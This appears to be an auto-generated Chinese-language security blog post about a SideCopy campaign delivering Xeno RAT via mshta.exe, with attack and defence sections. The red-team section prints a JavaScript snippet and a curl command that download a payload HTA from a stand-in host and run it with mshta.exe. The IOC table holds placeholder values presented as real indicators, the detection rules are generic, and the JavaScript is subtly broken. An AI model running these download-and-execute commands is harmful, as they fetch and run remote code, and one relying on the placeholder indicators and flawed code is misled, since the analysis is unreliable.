---
layout: post
title:  "Pakistan-Linked SideCopy Targets Afghanistan Finance Ministry with Xeno RAT"
date:   2026-06-02 10:10:16 +0000
categories: [security]
severity: high
---

# 🔥 解析 SideCopy 集團的 Xeno RAT 攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `mshta.exe`、JavaScript Obfuscation、Registry-based Persistence

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 `mshta.exe` 執行遠端 HTML 應用程式（HTA），從而在記憶體中執行混淆的 JavaScript 代碼。這種方法可以繞過傳統的安全防護機制。
* **攻擊流程圖解**:
  1. Spear Phishing：發送 ZIP 檔案，內含惡意 LNK 檔案。
  2. LNK 檔案執行：利用 `mshta.exe` 下載並執行遠端 HTA 檔案。
  3. JavaScript Obfuscation：在記憶體中執行混淆的 JavaScript 代碼。
  4. Xeno RAT 下載：下載並執行 Xeno RAT 1.8.7。
* **受影響元件**: Windows 10、Windows Server 2019

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要目標系統具有 Internet 連接，並且 `mshta.exe` 未被限制。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 混淆的 JavaScript 代碼
      var payload = "http://example.com/payload.hta";
      var mshta = "mshta.exe";
      var command = mshta + " " + payload;
      // 執行命令
      WScript.Shell(command);
    
    ```
 

```

bash
  # 使用 curl 下載並執行 HTA 檔案
  curl -s http://example.com/payload.hta > payload.hta
  mshta.exe payload.hta

```
* **繞過技術**: 可以使用 JavaScript Obfuscation 和 Code Obfuscation 技術來繞過傳統的安全防護機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\payload.hta |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Xeno_RAT {
        meta:
          description = "Xeno RAT Malware"
          author = "Your Name"
        strings:
          $a = "Xeno RAT" ascii
          $b = "mshta.exe" ascii
        condition:
          all of them
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"Xeno RAT Malware"; content:"mshta.exe"; sid:1000001; rev:1;)

```
* **緩解措施**: 禁止 `mshta.exe` 執行，限制 Internet 連接，並更新系統和軟體至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **mshta.exe**: Microsoft HTML Application Host，是一種 Windows 系統中的執行程式，負責執行 HTML 應用程式（HTA）。
* **JavaScript Obfuscation**: 一種技術，用于混淆 JavaScript 代碼，使其難以被人類閱讀和理解。
* **Registry-based Persistence**: 一種技術，用于在 Windows 系統中實現惡意程式的持久化，通過修改系統登錄表來實現。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/pakistan-linked-sidecopy-targets.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


